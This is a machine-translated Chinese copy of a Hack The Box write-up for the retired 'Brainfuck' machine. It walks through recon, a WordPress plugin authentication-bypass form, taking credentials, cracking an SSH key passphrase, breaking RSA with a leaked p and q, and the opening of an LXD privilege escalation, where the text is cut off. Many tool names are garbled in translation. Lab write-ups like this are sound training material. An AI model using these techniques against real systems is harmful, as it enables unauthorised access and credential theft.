#  
TLS 证书发现子域名  wordpresscms（没有认证登录，插件泄o露用户信息）
密码学 [Vigenere Cipher page](https://www.dcode.fr/vigenere-cipher)   ssh2john  RSA 的加密
# 0xdf黑客的东西

[0xdf.gitlab.io](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbrainfuck-cover.) 

脑是黑客盒子上发布的首批盒子之一。这是一个比今天在HTB上出现的更不现实和CTF风格的盒子，但它仍然有一些元素可以成为一个很好的学习机会。有WordPress的利用和一堆加密货币，包括RSA和维杰尼雷。

## 箱子信息

名字

[脑](https://www.hackthebox.eu/home/machines/profile/17) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-brainfuck.png) 

发行日期

29 4月 2017

停用日期

26 五月 2017

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

疯狂 \[50\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbrainfuck-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fbrainfuck-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

4小时16分15秒[![瓦格穆尔](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F82)](https://www.hackthebox.eu/home/users/profile/82)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

17小时49分53秒[![瓦格穆尔](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F82)](https://www.hackthebox.eu/home/users/profile/82)

造物主

[![](https://image.cubox.pro/article/2022091814483344911/94821.jpg)](https://www.hackthebox.eu/home/users/profile/1)-

## 侦察

### n地图

`nmap`查找五个打开的 TCP 端口，即固态混合端口 （22）、SMTP （25）、POP3 （110）、IMAP （143） 和 HTTPS （443）：

    oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.17
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-12 00:35 UTC
    Nmap scan report for 10.10.10.17
    Host is up (0.091s latency).
    Not shown: 65530 filtered ports
    PORT    STATE SERVICE
    22/tcp  open  ssh
    25/tcp  open  smtp
    110/tcp open  pop3
    143/tcp open  imap
    443/tcp open  https
    
    Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds
    oxdf@hacky$ nmap -p 22,25,110,143,443 -sCV 10.10.10.17
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-12 00:36 UTC
    Nmap scan report for 10.10.10.17
    Host is up (0.090s latency).
    
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
    |   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
    |_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
    25/tcp  open  smtp     Postfix smtpd
    |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    110/tcp open  pop3     Dovecot pop3d
    |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES PIPELINING USER AUTH-RESP-CODE UIDL CAPA
    143/tcp open  imap     Dovecot imapd
    |_imap-capabilities: AUTH=PLAINA0001 LOGIN-REFERRALS IDLE Pre-login more LITERAL+ post-login ENABLE have listed ID IMAP4rev1 capabilities OK SASL-IR
    443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
    |_http-server-header: nginx/1.10.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
    | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
    | Not valid before: 2017-04-13T11:19:29
    |_Not valid after:  2027-04-11T11:19:29
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |_  http/1.1
    Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 45.06 seconds
    

基于 [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) 版本，主机可能运行的是 Ubuntu 16.04 炔刻。TLS证书提供了一堆信息，因此我想更仔细地研究一下。

### 红绿灯系统证书

我将访问并查看 TLS 证书。有一个通用名称 ，以及 和 的 SAN：`https://10.10.10.17``brainfuck.htb``www.brainfuck.htb``sup3rs3cr3t.brainfuck.htb`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220511210428221.png) 

我还会将这些添加到：`/etc/hosts`

    10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
    

电子邮件地址也出现了几次。`orestis@brainfuck.htb`

我将运行 一个来查找其他子域，但它是空的。`wfuzz`

### 大脑htb - TCP 443

#### 按知识产权

通过IP访问时，该网站仅显示NGINX起始页：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220511205416314.png) 

#### 脑

访问重定向到 ，它显示了一个相对裸露的WordPress页面：`www.brainfuck.htb``brainfuck.htb`

[![image-20220516071751083](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516071751083.png)](https://0xdf.gitlab.io/img/image-20220516071751083.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20220516071751083.png)

有几个有用的部分：

*   副标题清楚地表明此页面是建立在WordPress上的。
*   该帖子由用户管理员发布。
*   该帖子说SMTP集成已准备就绪，并通过电子邮件orestis@brainfuck.htb（与TLS证书相同）。

#### 技术堆栈

该网站说它是建立在WordPress上的，我可以通过访问和查看登录表单上的WordPress徽标来确认：`/wp-admin`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220511210955982.png) 

#### 断续器

而不是暴力破解目录，我将从 .鉴于这个盒子已经超过五年了，它将为_很多东西_提供资金。我将忽略WordPress核心中的所有内容，并专注于已安装的插件：`wpscan`

    oxdf@hacky$ wpscan --url https://brainfuck.htb --disable-tls-checks --api-token $WPSCAN_API
    ...[snip]...
    [+] wp-support-plus-responsive-ticket-system
     | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
     | Last Updated: 2019-09-03T07:57:00.000Z
     | [!] The version is out of date, the latest version is 9.1.2
    ...[snip]...
     | Version: 7.1.3 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
     ...[snip]...
    

它正在运行WP支持加票务系统7.1.3。 在此插件中发现6个漏洞。当Brainfuck发布时，这个插件的当前版本是8.0.7，所以我将忽略两个声称是RCE的版本低于8.0.8的版本。`wpscan`

还有一些经过身份验证的SQL注入，我可以记住这一点，以防万一我找到信誉。剩下的最有趣的是：

     | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
     |     Fixed in: 8.0.0
     |     References:
     |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
     |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
     |      - https://packetstormsecurity.com/files/140413/
    

我一会儿会看一下。

### sup3rs3cr3t.brainfuck.htb - TCP 443

这个子域名引出了“超级秘密论坛”：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512083029905.png) 

在这一点上，我只能看到一个线程，它没有任何有趣的东西：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512083101749.png) 

当我尝试创建一个帐户时，它说：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512083134318.png) 

即使无法访问它，我似乎也已登录，但没有任何新内容或有趣内容。

## 壳体作为奥雷斯蒂斯

### 以管理员身份进行身份验证

WPScan调用的“权限升级”有[这个链接](https://packetstormsecurity.com/files/140413/)，上面写着：

> 由于wp\_set\_auth\_cookie（）的不正确使用，您可以在不知道密码的情况下以任何人的身份登录。

概念证明是一个页面，它将有助于生成正确的POST请求，我将更新该页面以具有正确的主机：

    <form method="post" action="http://brainfuck.htb/wp-admin/admin-ajax.php">
      Username: <input type="text" name="username" value="administrator">
      <input type="hidden" name="email" value="sth">
      <input type="hidden" name="action" value="loginGuestFacebook">
      <input type="submit" value="Login">
    </form>
    

打开显示一个简单的表单，询问我想认证为什么名称。我将输入 admin（帖子的作者）：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512075119269.png) 

HTML页面只是一个快速帮助生成此POST请求：

    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: brainfuck.htb
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 58
    Connection: close
    
    username=admin&email=sth&action=loginGuestFacebook
    

我将提交它，它最终会加载一个空页面。但是看看打嗝，就会发现它正在设置饼干。在刷新主页时，现在我已登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072000984.png) 

### 断续器故障

#### 编辑主题

通常，具有对WordPress的管理员访问权限，有几种方法可以获得执行。一种是转到外观>编辑器并尝试编辑主题：

[![image-20220516072326286](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072326286.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20220516072326286.png)

我看主题的原因是它们包含PHP，不像POST只是文本/格式。在这种情况下，编辑器报告文件不可编辑。在CTF中很常见，并且在现实世界中变得越来越普遍，使运行Web服务器的用户无法编辑主题PHP文件，否则这基本上是执行。

#### 插件上传

按照菜单通过“插件”>“添加插件”将我带到以下形式：

[![image-20220516072511392](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072511392.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20220516072511392.png)

它抱怨一些错误，但这可能是HTB实验室缺乏互联网。“上传插件”按钮会导致另一个表单出现类似的错误：

[![image-20220516072534309](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072534309.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20220516072534309.png)

我在[Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html#new-plugin)中展示了如何生成一个简单的网络外壳插件。我将获取我在Spectra中使用的相同ZIP文件并上传它，但是有一个错误：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512080428649.png) 

#### 插件编辑

我也可以尝试“插件”菜单下的“编辑器”链接。例如，它可以加载：`akismet.php`

[![image-20220516072638003](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072638003.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20220516072638003.png)

Unfortunately, it has the same text at the bottom. It seems the admin has made the entire WordPress directory structure not writable by the web user.

### Access orestis’ Email

#### Credentials

Going back to the Plugins page, there are four plugins listed:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512080915471.png) 

博客文章正在讨论SMTP集成。我会查看“设置”链接：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512081433613.png) 

它被设置为使用脑SMTP服务器，并且似乎保存了凭据。如果我右键单击该字段并选择检查，我可以看到它是“密码”的标签，这会遮盖字符：`input``type`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512081617512.png) 

但我也可以看到值，“千国乙二十九”。

#### 邮箱

我正在使用的 Ubuntu VM 已经安装了进化，所以我将打开它，它会弹出一个欢迎向导：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512081854889.png) 

通过向导，它挂起试图识别我的身份，但我会点击跳过按钮并进入“接收电子邮件”：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512082108580.png) 

我将使用密码身份验证将所有支持加密的默认值更改为 143 上的普通连接。我不认为我需要发送邮件，但我会设置相同的方式，在25上使用未加密的SMTP：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512082211001.png) 

单击“完成”会弹出一个身份验证请求，我将输入密码。我有权访问邮箱。

[![image-20220516072723015](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220516072723015.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20220516072723015.png)

第一封电子邮件来自wordpress关于新网站。没什么有趣的。

第二个有“秘密论坛”的凭据：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512082606491.png) 

### 固态混合硬盘访问

#### 枚举论坛

有了这些信誉，我将以orestis的身份登录论坛，并且有两个新线程可用：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512083502432.png) 

第一个，“SSH访问”显示了管理员和orestis之间的对话：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512083555083.png) 

我会注意到，Orestis似乎有一个签名块，适用于他们所有的帖子，“Orestis - 为了娱乐和利润而黑客攻击”。

第二个线程是用非标准语言编写的，就像加密线程管理员所提到的：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512084212154.png) 

我会注意到，Orestis的每篇文章都以相同的结构结尾，7个字母单词，破折号，7个字母单词，3个字母单词和一个6个字母的单词，即使字母被打乱。

#### 查找解密密钥

我将采用其中一个加密签名和纯文本签名，然后放入Python：

    oxdf@hacky$ python
    Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
    [GCC 9.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> enc = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
    >>> pt = "Orestis - Hacking for fun and profit"
    >>> assert len(enc) == len(pt)
    

`zip`将从每个字符串中获取一个字符并将其配对在一起：

    >>> list(zip(enc, pt))
    [('P', 'O'), ('i', 'r'), ('e', 'e'), ('a', 's'), ('g', 't'), ('n', 'i'), ('m', 's'), (' ', ' '), ('-', '-'), (' ', ' '), ('J', 'H'), ('k', 'a'), ('o', 'c'), ('i', 'k'), ('j', 'i'), ('e', 'n'), ('g', 'g'), (' ', ' '), ('n', 'f'), ('b', 'o'), ('w', 'r'), (' ', ' '), ('z', 'f'), ('w', 'u'), ('x', 'n'), (' ', ' '), ('m', 'a'), ('l', 'n'), ('e', 'd'), (' ', ' '), ('g', 'p'), ('r', 'r'), ('w', 'o'), ('s', 'f'), ('n', 'i'), ('n', 't')]
    

我将用它来开始尝试将它们组合在一起的方法。通过一些实验，我可以找到一把钥匙

    >>> [ord(e)-ord(p) for e,p in zip(enc, pt)]
    [1, -9, 0, -18, -13, 5, -6, 0, 0, 0, 2, 10, 12, -2, 1, -9, 0, 0, 8, -13, 5, 0, 20, 2, 10, 0, 12, -2, 1, 0, -9, 0, 8, 13, 5, -6]
    >>> [(ord(e)-ord(p))%26 for e,p in zip(enc, pt)]
    [1, 17, 0, 8, 13, 5, 20, 0, 0, 0, 2, 10, 12, 24, 1, 17, 0, 0, 8, 13, 5, 0, 20, 2, 10, 0, 12, 24, 1, 0, 17, 0, 8, 13, 5, 20]
    >>> [(ord(e)-ord(p))%26 + ord('a') for e,p in zip(enc, pt)]
    [98, 114, 97, 105, 110, 102, 117, 97, 97, 97, 99, 107, 109, 121, 98, 114, 97, 97, 105, 110, 102, 97, 117, 99, 107, 97, 109, 121, 98, 97, 114, 97, 105, 110, 102, 117]
    >>> [chr((ord(e)-ord(p))%26 + ord('a')) for e,p in zip(enc, pt)]
    ['b', 'r', 'a', 'i', 'n', 'f', 'u', 'a', 'a', 'a', 'c', 'k', 'm', 'y', 'b', 'r', 'a', 'a', 'i', 'n', 'f', 'a', 'u', 'c', 'k', 'a', 'm', 'y', 'b', 'a', 'r', 'a', 'i', 'n', 'f', 'u']
    

关键是像“大脑”或“我的大脑”，或者可能是“脑”。

#### 解密

I’ll jump over to the [Vigenere Cipher page](https://www.dcode.fr/vigenere-cipher) on decode.fr and decode the message:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220512085932293.png) 

其余消息解码为：

> **奥雷斯蒂斯**：嘿，给我一个关键婊子的网址:)
> 
> **管理员**：说请，我可能会这样做...
> 
> **奥利斯蒂斯**：普莱亚斯
> 
> **管理员**：你去你愚蠢的他妈的，我希望你记住你的密钥密码，因为我不:)
> 
> `https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa`
> 
> **奥雷斯蒂斯**：没问题，我会强行;)

#### 解密固态混合密钥

`curl`将抓住钥匙：

    oxdf@hacky$ curl https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
    
    mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
    ...[snip]...
    6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
    -----END RSA PRIVATE KEY-----
    

我将使用从密钥生成哈希值，然后用以下命令破解它：`ssh2john.py``john`

    
```
oxdf@hacky$ ssh2john.py brainfuck-orestis > brainfuck-orestis.hash
    oxdf@hacky$ john brainfuck-orestis.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
    Cost 2 (iteration count) is 1 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
    3poulakia!       (brainfuck-orestis)     
    1g 0:00:00:02 DONE (2022-05-12 13:37) 0.4366g/s 5441Kp/s 5441Kc/s 5441KC/s 3pran54..3porfirio
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
```

    

使用该密钥，我将使用以下命令保存一个没有密码的副本：`openssl`

    oxdf@hacky$ openssl rsa -in brainfuck-orestis -out ~/keys/brainfuck-orestis 
    Enter pass phrase for brainfuck-orestis:
    writing RSA key
    

#### 固态混合苯

使用该密钥，我可以连接：

    oxdf@hacky$ ssh -i ~/keys/brainfuck-orestis orestis@10.10.10.17
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
    ...[snip]...
    orestis@brainfuck:~$
    

并抓住第一面旗帜：

    orestis@brainfuck:~$ cat user.txt
    2c11cfbc************************
    

## 根.txt

### 列举

在orestis的主目录中还有其他一些文件：

    orestis@brainfuck:~$ ls
    debug.txt  encrypt.sage  mail  output.txt  user.txt
    

`mail`是一个空目录。这两个文件具有长数字，并将其标记为“加密密码”：`.txt``output.txt`

    orestis@brainfuck:~$ cat debug.txt 
    7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    orestis@brainfuck:~$ cat output.txt 
    Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
    

`encrypt.sage`是一个脚本。

### 中断 RSA

#### 加密鼠尾草

[SageMath](https://en.wikipedia.org/wiki/SageMath)是一种基于Python构建的开源数学编程语言，这意味着任何了解Python的人都会非常熟悉语法。

此脚本相对简单：

    nbits = 1024
    
    password = open("/root/root.txt").read().strip()
    enc_pass = open("output.txt","w")
    debug = open("debug.txt","w")
    m = Integer(int(password.encode('hex'),16))
    
    p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    n = p*q
    phi = (p-1)*(q-1)
    e = ZZ.random_element(phi)
    while gcd(e, phi) != 1:
        e = ZZ.random_element(phi)
    
    
    
    c = pow(m, e, n)
    enc_pass.write('Encrypted Password: '+str(c)+'\n')
    debug.write(str(p)+'\n')
    debug.write(str(q)+'\n')
    debug.write(str(e)+'\n')
    

它读入一个名为 的变量，然后将该文本转换为单个大整数。然后，它会生成一些额外的整数、、、、和 。这些是 [RSA 加密](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation)中使用的整数。`root.txt``password``p``q``n``phi``e`

它使用消息 、 和 进行计算，这是 RSA 的加密机制。然后，它将加密的结果写入 、 和 和 。`c``e``n``output.txt``p``q``e``debug.txt`

#### 解密

维基百科RSA页面的[这一段](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation)指出了我将利用的内容：

> _公钥_由模数 _n_ 和公共（或加密）指数 _e 组成_。_私钥_由私钥（或解密）指数 _d_ 组成，必须保密。_p_、_q_ 和 _λ_（_n_） 也必须保密，因为它们可用于计算 _d_。事实上，在计算_出 d_ 之后，它们都可以被丢弃。\[[注16\]](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#cite_note-16)

为了使 RSA 安全，并且必须保密。访问 、 和 ， 计算（解密密钥）是微不足道的。`p``q``p``q``e``d`

[这个堆栈交换帖子](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)包括一个Python脚本来做到这一点。我将更新常量以匹配 Brainfuck 上的内容：

    def egcd(a, b):
        x,y, u,v = 0,1, 1,0
        while a != 0:
            q, r = b//a, b%a
            m, n = x-u*q, y-v*q
            b,a, x,y, u,v = a,r, u,v, m,n
            gcd = b
        return gcd, x, y
    
    def main():
    
        p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
        q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
        e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
        ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
    
        # compute n
        n = p * q
    
        # Compute phi(n)
        phi = (p - 1) * (q - 1)
    
        # Compute modular inverse of e
        gcd, a, b = egcd(e, phi)
        d = a
    
        print( "n:  " + str(d) );
    
        # Decrypt ciphertext
        pt = pow(ct, d, n)
        print( "pt: " + str(pt) )
    
    if __name__ == "__main__":
        main()
    

现在运行打印明文（有点像）：

    oxdf@hacky$ python decrypt_rsa.py 
    n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
    pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
    

#### 转换为一经社国际

该脚本以大整数形式提供纯文本。我将使用一个蟒蛇终端将其转换回 ASCII：

    oxdf@hacky$ python
    Python 3.8.10 (default, Mar 15 2022, 12:22:08) 
    [GCC 9.4.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
    >>> f"{pt:x}"
    '3665666331613564626238393034373531636536353636613330356262386566'
    >>> bytes.fromhex(f"{pt:x}").decode()
    '6efc1a5d************************'
    

首先，我使用 f 字符串将整数转换为十六进制，然后将其转换为字节并解码以获得 ASCII。

不幸的是，没有办法从这条路上得到一个外壳。

## 外壳作为根 \[替代\]

### 列举

奥瑞斯提斯是该组的一部分：`lxd`

    orestis@brainfuck:~$ id
    uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
    

在组中意味着我可以与 Linux 容器运行时进行交互。没有容器正在运行：`lxd``lxc`

    orestis@brainfuck:~$ lxc list
    Generating a client certificate. This may take a minute...
    If this is your first time using LXD, you should also run: sudo lxd init
    To start your first container, try: lxc launch ubuntu:16.04
    
    +------+-------+------+------+------+-----------+
    | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
    +------+-------+------+------+------+-----------+
    

也没有可用的图像：

    orestis@brainfuck:~$ lxc image list
    +-------+-------------+--------+-------------+------+------+-------------+
    | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
    +-------+-------------+--------+-------------+------+------+-------------+
    

### 断续器开发

#### 策略

我之前已经多次展示过这个漏洞，但自2020年11月以来就没有使用[过Tabby](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html#lxc-exploitation)。这里的想法是用于各种虚拟化攻击的相同策略。我将创建一个新容器，并将整个主机操作系统装载到该容器的某个位置。然后，我将以 root 身份在该容器上获取一个 shell，并拥有对主机文件系统的完全访问权限。

要创建一个容器，我必须生成一个图像，将其加载到Brainfuck上，然后从中生成一个容器。此漏洞的大多数示例将使用Alpine容器，因为它是最小的公共容器，因此最容易上传。因为我不需要完整的映像，而是足够获得带有挂载主机文件系统的shell，我最喜欢的利用它的方法来自M0noc[的这篇文章](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)，它创建了一个656字节的字符串，可用于制作准系统忙碌框映像。

#### 加载图像

在 工作，我将通过从帖子中复制命令来“上传”图像：`/dev/shm``echo`

    orestis@brainfuck:/dev/shm$ echo 